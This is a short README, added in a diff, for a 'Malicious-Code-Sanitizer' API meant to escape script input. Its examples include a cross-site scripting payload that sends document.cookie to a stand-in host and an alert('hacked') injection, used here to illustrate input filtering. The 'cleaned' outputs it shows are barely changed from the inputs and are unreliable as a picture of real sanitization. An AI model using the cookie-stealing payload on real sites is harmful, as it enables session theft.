@@ -1,0 +1,2 @@
+# Malicious-Code-Sanitizer
+An API/Library to Sanitize Malicious Code Input : Malicious Code  Eg. '>&lt;script>document.location= 'http://www.example.com/index.php? param='+document.cookie&lt;/script>' Output : &lt;script>document.location= 'http://www.example.com/index.php? param='+document.cookie&lt;/script>'  API Structure : domain.com/sanitizestring/string="'>&lt;script>alert("hacked");&lt;/script>" JSON Response of API  : { "BadString" : "'>&lt;script>alert("hacked");&lt;/script>", "CleanedString":"&lt;script>alert("hacked");&lt;/script>" }
